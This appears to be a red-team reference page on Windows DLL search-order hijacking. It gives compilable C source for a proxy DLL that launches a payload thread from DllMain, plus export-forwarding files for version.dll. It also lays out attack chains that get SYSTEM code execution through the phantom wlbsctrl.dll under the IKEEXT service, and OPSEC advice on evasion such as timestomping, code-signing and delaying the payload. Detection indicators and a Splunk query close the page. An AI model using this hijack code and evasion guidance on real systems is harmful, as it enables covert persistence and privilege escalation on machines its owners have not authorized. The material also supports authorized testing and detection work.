# DLL Hijack Discovery - Code Implementations

MITRE ATT&CK: T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

DLL search order hijacking exploits the predictable sequence in which Windows searches for DLLs when a process loads them. By placing a malicious DLL in a location that is searched **before** the legitimate DLL, an attacker can execute arbitrary code in the context of a trusted process. This technique is particularly valuable for defense evasion because the malicious code runs inside a legitimate, often signed, process.

See also: [DLL Hijacking (Narrative)](../../04-persistence/dll-hijacking.md)

## Windows DLL Search Order

```
When LoadLibrary("example.dll") is called, Windows searches in this order:

1. Known DLLs registry
   HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
   These are pre-mapped at boot time and CANNOT be hijacked via search order.
   Includes: kernel32.dll, ntdll.dll, user32.dll, advapi32.dll, etc.

2. The directory from which the application loaded (application directory)
   e.g., C:\Program Files\VulnApp\

3. The system directory
   C:\Windows\System32\

4. The 16-bit system directory
   C:\Windows\System\

5. The Windows directory
   C:\Windows\

6. The current working directory (CWD)

7. Directories in the PATH environment variable
   Searched left to right

IMPORTANT CAVEATS:
  - SafeDllSearchMode (enabled by default since XP SP2) moves CWD to
    AFTER the system directories (position 6 instead of position 2).
  - DLL redirection (.local files) and manifests can override this order.
  - API sets (api-ms-win-*) are resolved through the API set schema,
    NOT through file search.

+-------------------------------------------------------------------+
| HIJACK OPPORTUNITY EXISTS WHEN:                                    |
|   - Application loads DLL from directory X                         |
|   - Directory Y is searched BEFORE directory X                     |
|   - Attacker can write to directory Y                              |
|                                                                    |
| MOST COMMON PATTERN:                                               |
|   Application in C:\Program Files\App\ loads DLL from System32    |
|   --> Place malicious DLL in C:\Program Files\App\ (position 2)   |
|   --> It gets loaded instead of the System32 version (position 3)  |
+-------------------------------------------------------------------+
```

## Phantom DLL Concept

```
A "phantom DLL" is a DLL that an application attempts to load but that
does NOT exist anywhere on the system. The application calls LoadLibrary(),
the DLL search walks through all search order positions, fails, and the
application handles the error (usually by continuing without the DLL).

Why this matters for attackers:
  - Placing a DLL with the phantom name in ANY search order position works
  - There is no legitimate DLL to conflict with
  - No existing functionality breaks (the app already handles the absence)
  - The DLL is loaded into a legitimate process without modifying any
    existing files

Common phantom DLLs (application-dependent; verify with Process Monitor):
  - wlbsctrl.dll    (loaded by IKEEXT service -- svchost.exe context)
  - wbemcomn.dll     (loaded by some WMI-dependent processes)
  - Tsmsisrv.dll     (loaded by SessionEnv service)
  - LINKINFO.dll     (loaded by explorer.exe on some configurations)
  - ntshrui.dll      (loaded by explorer.exe in some scenarios)

OPSEC: Phantom DLLs are among the stealthiest hijack targets because
they do not replace any existing file. However, placing a new DLL in
a monitored directory (like System32 or a Program Files subdirectory)
still generates file creation events.
```

## Process Monitor Discovery Methodology

```
STEP 1: Configure Process Monitor filters
  Column: Operation     is  CreateFile       then Include
  Column: Result        is  NAME NOT FOUND   then Include
  Column: Path          ends with  .dll      then Include

  This shows all DLL load attempts that FAILED (file not found).

STEP 2: Run the target application or trigger the target service.

STEP 3: Analyze results. Look for:
  - DLL paths where you have write access
  - DLL names that are not in KnownDLLs
  - Processes running with elevated privileges (SYSTEM, admin)
  - Services that auto-start (for persistence via hijack)

STEP 4: Verify the hijack:
  - Create a test DLL that writes to a log file in DllMain
  - Place it in the identified path
  - Restart the service or application
  - Check if the log file was created

  +----------------------------------------------------------+
  | CRITICAL: Before deploying a proxy DLL, verify that the  |
  | target application actually USES exports from the DLL.   |
  | If it does, you MUST forward those exports or the        |
  | application will crash, which is VERY noisy.             |
  +----------------------------------------------------------+
```

## C Implementation: Minimal Proxy DLL

```c
/*
 * proxy_dll.c
 * A minimal DLL that executes a payload in DllMain and optionally forwards
 * exports to the legitimate DLL (proxy/passthrough pattern).
 *
 * The proxy pattern:
 *   1. Application loads our DLL (thinking it is the legitimate one)
 *   2. DllMain runs our payload (e.g., CreateThread for a beacon)
 *   3. Any exported function calls are forwarded to the real DLL
 *      (which we load from its legitimate location)
 *
 * This way the application works normally AND our code runs.
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 7 (Image loaded): DLL loaded from unexpected directory
 *   - The DLL will likely be UNSIGNED while the application is signed
 *     --> "Unsigned DLL in signed application directory" is a detection rule
 *   - File creation event in the target directory (Sysmon Event 11)
 *   - If the proxy loads the real DLL, TWO DLLs with similar names appear
 *     in the process module list
 *
 * OPSEC:
 *   - Code-signing the proxy DLL dramatically reduces detection
 *   - Matching the file metadata (version info, description) helps
 *   - Timestomping the DLL to match nearby files reduces suspicion
 *   - Using DLL_PROCESS_ATTACH in DllMain has a loader lock constraint:
 *     avoid complex operations; use CreateThread to defer payload execution
 *
 * Compile:
 *   cl.exe /W4 /LD /Fe:version.dll proxy_dll.c /link /DEF:version.def
 *   (The .def file defines the forwarded exports)
 */

#include <windows.h>

/* Forward declaration for the payload thread */
DWORD WINAPI PayloadThread(LPVOID lpParam);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        /* OPSEC: Disable DLL_THREAD_ATTACH/DETACH notifications to reduce
         * overhead and avoid repeated payload execution. */
        DisableThreadLibraryCalls(hModule);

        /* CRITICAL: Do NOT perform heavy operations here.
         * DllMain runs under the loader lock. If you call LoadLibrary,
         * wait on synchronization objects, or perform network I/O here,
         * you risk deadlocking the entire process.
         *
         * Instead, spawn a thread that runs the actual payload. */
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    (void)lpParam;

    /* OPSEC: Add a small delay before payload execution.
     * This allows the host application to finish initializing,
     * reducing the chance of stability issues. It also moves
     * our network activity away from the process start time,
     * making timeline analysis harder. */
    Sleep(5000);

    /*
     * === PAYLOAD GOES HERE ===
     *
     * Options:
     * 1. Load and execute shellcode from a resource or remote source
     * 2. Connect back to C2 infrastructure
     * 3. Load another DLL reflectively
     * 4. Execute a command via CreateProcessW
     *
     * For demonstration, we simply create a marker file.
     * Replace with actual payload for authorized engagements.
     */
    HANDLE hFile = CreateFileW(
        L"C:\\Windows\\Temp\\hijack_test.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        const char msg[] = "DLL hijack executed successfully.\r\n";
        DWORD written;
        WriteFile(hFile, msg, sizeof(msg) - 1, &written, NULL);
        CloseHandle(hFile);
    }

    return 0;
}
```

## Export Forwarding via .DEF File

```
; version.def
; Module definition file for version.dll proxy
;
; This file tells the linker to create forwarded exports.
; When the application calls GetFileVersionInfoW(), the call is
; transparently redirected to the REAL version.dll in System32.
;
; Syntax: ExportName = RealDllName.ExportName
;
; OPSEC: The forwarding target is stored in the PE export directory.
; Tools like CFF Explorer or dumpbin /exports will reveal the forwarding,
; but runtime behavior is transparent to the host application.
;
; To find the exports you need to forward:
;   dumpbin /exports C:\Windows\System32\version.dll

LIBRARY version
EXPORTS
    GetFileVersionInfoA         = realversion.GetFileVersionInfoA
    GetFileVersionInfoByHandle  = realversion.GetFileVersionInfoByHandle
    GetFileVersionInfoExA       = realversion.GetFileVersionInfoExA
    GetFileVersionInfoExW       = realversion.GetFileVersionInfoExW
    GetFileVersionInfoSizeA     = realversion.GetFileVersionInfoSizeA
    GetFileVersionInfoSizeExA   = realversion.GetFileVersionInfoSizeExA
    GetFileVersionInfoSizeExW   = realversion.GetFileVersionInfoSizeExW
    GetFileVersionInfoSizeW     = realversion.GetFileVersionInfoSizeW
    GetFileVersionInfoW         = realversion.GetFileVersionInfoW
    VerFindFileA                = realversion.VerFindFileA
    VerFindFileW                = realversion.VerFindFileW
    VerInstallFileA             = realversion.VerInstallFileA
    VerInstallFileW             = realversion.VerInstallFileW
    VerLanguageNameA            = realversion.VerLanguageNameA
    VerLanguageNameW            = realversion.VerLanguageNameW
    VerQueryValueA              = realversion.VerQueryValueA
    VerQueryValueW              = realversion.VerQueryValueW
```

## Alternative: Linker Pragma Export Forwarding

```c
/*
 * pragma_forward.c
 * Alternative approach: use #pragma comment(linker, ...) to define forwarded
 * exports directly in the C source without a .def file.
 *
 * This is more convenient for small numbers of exports but less maintainable
 * for DLLs with many exports.
 *
 * OPSEC: Identical behavior to the .def file approach. The PE export
 * directory contains the same forwarding entries.
 */

#include <windows.h>

/* Forward exports to the real version.dll (renamed to realversion.dll)
 * The #pragma comment(linker, "/export:...") directive adds an export
 * to the PE at link time. */
#pragma comment(linker, "/export:GetFileVersionInfoA=realversion.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=realversion.GetFileVersionInfoW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=realversion.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=realversion.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:VerQueryValueA=realversion.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=realversion.VerQueryValueW")
#pragma comment(linker, "/export:GetFileVersionInfoExA=realversion.GetFileVersionInfoExA")
#pragma comment(linker, "/export:GetFileVersionInfoExW=realversion.GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=realversion.GetFileVersionInfoSizeExA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=realversion.GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:VerFindFileA=realversion.VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW=realversion.VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA=realversion.VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW=realversion.VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=realversion.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=realversion.VerLanguageNameW")

/* DllMain with payload -- identical to proxy_dll.c above */
DWORD WINAPI PayloadThread(LPVOID lpParam) {
    (void)lpParam;
    Sleep(5000);
    /* Payload here */
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}
```

## Example: wlbsctrl.dll with IKEEXT Service

```
TARGET: IKEEXT (IKE and AuthIP IPsec Keying Modules) service
DLL:    wlbsctrl.dll (Windows Load Balancing Service control DLL)
STATUS: Phantom DLL -- does NOT exist by default on modern Windows

Attack chain:
  1. IKEEXT service starts (it is set to Manual/Trigger start by default)
  2. svchost.exe loads ikeext.dll
  3. ikeext.dll calls LoadLibrary("wlbsctrl.dll")
  4. Windows searches: Known DLLs (no) -> App dir (no) -> System32 (no) ->
     System (no) -> Windows (no) -> CWD (no) -> PATH (no) -> FAIL
  5. If attacker places wlbsctrl.dll in C:\Windows\System32\, it loads
     in the context of svchost.exe running as SYSTEM

OPSEC CONSIDERATIONS:
  - Writing to System32 requires admin privileges
  - IKEEXT is a Trigger Start service -- you may need to trigger it:
      netsh ipsec static add policy name=test
    or simply wait for a VPN/IPsec connection attempt
  - The DLL runs as NT AUTHORITY\SYSTEM
  - No export forwarding needed (phantom DLL -- nothing to proxy)

DETECTION:
  - File creation in System32 (Sysmon Event 11)
  - Unsigned DLL loaded by svchost.exe (Sysmon Event 7 with signature checks)
  - Service startup of IKEEXT followed by unusual child process or network conn
```

## Example: version.dll with Common Applications

```
TARGET: Many applications load version.dll from their application directory
        before falling back to System32. This includes:
        - Some portable applications
        - Applications installed in user-writable directories
        - Applications launched from Downloads folder

Attack chain:
  1. Rename legitimate C:\Windows\System32\version.dll to realversion.dll
     and place it alongside the proxy, OR (preferred) have the proxy load
     version.dll by full path: LoadLibraryW(L"C:\\Windows\\System32\\version.dll")
  2. Place proxy version.dll in the application directory
  3. Application starts, searches app dir first, finds our proxy
  4. Proxy DllMain runs payload thread
  5. Export calls are forwarded to real version.dll -- app works normally

OPSEC:
  - Does NOT require renaming the real DLL if you use full-path loading
    in the proxy (call LoadLibraryW with absolute path to System32\version.dll)
  - Application directory is usually writable by the user who installed it
  - No admin required if targeting user-installed applications
  - version.dll is a very common hijack target -- some EDR products
    specifically look for version.dll loaded from non-System32 paths
```

## Detection Indicators

- **Sysmon Event 7** (Image loaded): key fields are `ImageLoaded` (DLL path), `Signed`, `SignatureStatus`. An unsigned DLL loaded from a non-System32 path by a signed application is a high-fidelity signal.
- **Sysmon Event 11** (FileCreate): new DLL file appearing in an application directory.
- **Filesystem**: DLLs with mismatched timestamps, PE version info not matching the application publisher, or paired names like `version.dll` + `realversion.dll` (proxy pattern indicator).

### Detection Queries

```
# Splunk: Known hijackable DLL names from unusual paths
index=sysmon EventCode=7
  ImageLoaded IN ("*\\version.dll", "*\\wlbsctrl.dll", "*\\LINKINFO.dll",
                  "*\\ntshrui.dll", "*\\wbemcomn.dll")
  NOT ImageLoaded IN ("C:\\Windows\\System32\\*", "C:\\Windows\\SysWOW64\\*",
                      "C:\\Windows\\WinSxS\\*")
| stats count by Image, ImageLoaded, Signed, SignatureStatus
```

## Cross-References

- [DLL Hijacking (Narrative)](../../04-persistence/dll-hijacking.md)
- [Service Persistence (Code)](service-persistence.md) -- service-based loading context
- [Registry Persistence (Code)](registry-persistence-code.md) -- AppInit_DLLs is related
- [Detection Engineering](../../12-detection-engineering/)
